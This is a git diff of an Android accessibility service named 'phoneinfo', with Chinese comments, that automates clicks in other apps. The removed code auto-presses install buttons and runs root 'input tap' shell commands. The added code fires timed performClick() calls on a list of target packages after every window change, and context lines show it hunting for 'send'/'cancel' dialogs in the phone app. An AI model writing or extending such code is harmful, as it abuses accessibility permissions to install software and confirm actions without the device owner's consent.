@@ -3,6 +3,7 @@ package com.phoneinfo;
 import android.accessibilityservice.AccessibilityService;
 import android.content.res.Resources;
 import android.os.Build;
+import android.text.TextUtils;
 import android.util.DisplayMetrics;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
@@ -11,6 +12,8 @@ import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
 import org.greenrobot.eventbus.ThreadMode;
 
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
@@ -22,6 +25,8 @@ import io.reactivex.functions.Consumer;
  */
 
 public class MyAccessibilityService extends AccessibilityService {
+    private static final String [] packageNames = {"com.mp.b","com.phoneinfo"};
+    private static List<String> list = new ArrayList<>();
     public MyAccessibilityService() {
     }
 
@@ -37,6 +42,7 @@ public class MyAccessibilityService extends AccessibilityService {
         LogManager.e("connect--------");
         EventBus.getDefault().register(this);
         EventBus.getDefault().post(new Message(""));
+        list = Arrays.asList(packageNames);
 
     }
 
@@ -56,58 +62,67 @@ public class MyAccessibilityService extends AccessibilityService {
         final int eventType = event.getEventType();
         switch (eventType) {
             case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
+                click();
                 //这个地方没什么好说的 你就理解成 找到当前界面 包含有安装 这个关键词的 所有节点就可以了。返回这些节点的list
                 //注意这里的find 其实是contains的意思，比如你界面上有2个节点，一个节点内容是安装1 一个节点内容是安装2，那这2个节点是都会返回过来的
                 //除了有根据Text找节点的方法 还有根据Id找节点的方法。考虑到众多手机rom都不一样，这里需要大家多测试一下，有的rom packageInstall
                 //定制的比较深入，可能和官方rom里差的很远 这里就要做冗余处理，可以告诉大家一个小技巧 你就把这些rom的 安装器打开 然后
                 //通过ddms里 看view结构的按钮 直接进去看就行了，可以直接看到那个界面属于哪个包名，也可以看到你要捕获的那个按钮的id是什么 很方便！
-                if("com.look.xy".equals(null==event.getSource()?"":event.getSource().getPackageName())){
-                    if("com.xy.WelcomeActivity".equals(event.getClassName())){
-                        findByTextAndClick(event.getSource(),"继续安装");
-                        findByTextAndClick(event.getSource(),"安装");
-                        Observable.timer(1, TimeUnit.SECONDS).subscribe(new Consumer<Long>() {
-                            @Override
-                            public void accept(Long aLong) throws Exception {
-                                LogManager.e("延迟执行");
-                                Utils.execShellCmd("input tap 360 360");
-                                Utils.execShellCmd("input tap 367 480");
-                            }
-                        }, new Consumer<Throwable>() {
-                            @Override
-                            public void accept(Throwable throwable) throws Exception {
-                                LogManager.e("welcome---click--error-");
-                            }
-                        });
-                    }
-
-                    Resources resources = this.getResources();
-                    DisplayMetrics dm = resources.getDisplayMetrics();
-                    final int width = dm.widthPixels;
-                    final int height = dm.heightPixels;
-                    if("com.rrit.wmn.doplfk".equals(event.getClassName())){
-                        Observable.timer(2, TimeUnit.SECONDS).subscribe(new Consumer<Long>() {
-                            @Override
-                            public void accept(Long aLong) throws Exception {
-                                LogManager.e("MainActivity延迟执行");
-                                    Utils.execShellCmd("input tap " + width / 2 + " " + height / 2);
-                            }
-                        }, new Consumer<Throwable>() {
-                            @Override
-                            public void accept(Throwable throwable) throws Exception {
-                                LogManager.e("su---error");
-                                performClick();
-                            }
-                        });
-                    }
-
-
-                }
                 break;
             default:
                 break;
         }
     }
 
+    private boolean isPackage(AccessibilityEvent event){
+        if(event==null)
+            return false;
+        if(null!=event.getSource()){
+            CharSequence p = event.getSource().getPackageName();
+            if(!TextUtils.isEmpty(p)&&list.contains(p.toString())){
+                return true;
+            }
+
+        }
+        return false;
+    }
+
+    private boolean isPackageBygetRootInActiveWindow(){
+        if(getRootInActiveWindow()==null)
+            return false;
+        if(null!=getRootInActiveWindow().getPackageName()){
+            if(list.contains(getRootInActiveWindow().getPackageName().toString())){
+                return true;
+            }
+
+        }
+        return false;
+    }
+    private void click(){
+
+        Resources resources = this.getResources();
+        final DisplayMetrics dm = resources.getDisplayMetrics();
+        final int width = dm.widthPixels;
+        final int height = dm.heightPixels;
+            Observable.timer(10, TimeUnit.SECONDS).subscribe(new Consumer<Long>() {
+                @Override
+                public void accept(Long aLong) throws Exception {
+                    if(isPackageBygetRootInActiveWindow()){
+                        LogManager.e("MainActivity延迟执行");
+//                        Utils.execShellCmd("input tap " + width / 2 + " " + height / 2);
+//                        Toast.makeText(getApplicationContext(),"click",Toast.LENGTH_SHORT).show();
+                        performClick();
+                    }
+
+                }
+            }, new Consumer<Throwable>() {
+                @Override
+                public void accept(Throwable throwable) throws Exception {
+                    LogManager.e("su---error");
+                    click();
+                }
+            });
+    }
 
     public boolean  findByText(String str){
         boolean isFind = false;
@@ -165,6 +180,7 @@ public class MyAccessibilityService extends AccessibilityService {
     @Override
     public void onInterrupt() {
         LogManager.e("onInterrupt--------");
+        list.clear();
         EventBus.getDefault().post(new Message("关闭成功"));
         EventBus.getDefault().unregister(this);
 
@@ -179,7 +195,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 String className = getRootInActiveWindow().getClassName()+"";
                 LogManager.e("onMessageEvent--packageName:"+packageName);
                 LogManager.e("onMessageEvent--className:"+className);
-
+                click();
                 if(packageName.equals("com.android.phone")){
                     if(findByContainsText("发送")
                             &&findByContainsText("取消")
@@ -282,7 +298,7 @@ public class MyAccessibilityService extends AccessibilityService {
             for (int i = 0; i <  nodeInfo.getChildCount(); i++) {
                 AccessibilityNodeInfo nodeIn = nodeInfo.getChild(i);
                 LogManager.e("PackageName"+nodeIn.getPackageName());
-                if("com.look.xy".equals(nodeIn.getPackageName())){
+                if(list.contains(nodeIn.getPackageName().toString())){
                     if("android.widget.ImageView".equals(nodeInfo.getChild(i).getClassName())){
 
                         LogManager.e("获取到imageView:getViewIdResourceName"+nodeIn.getViewIdResourceName());
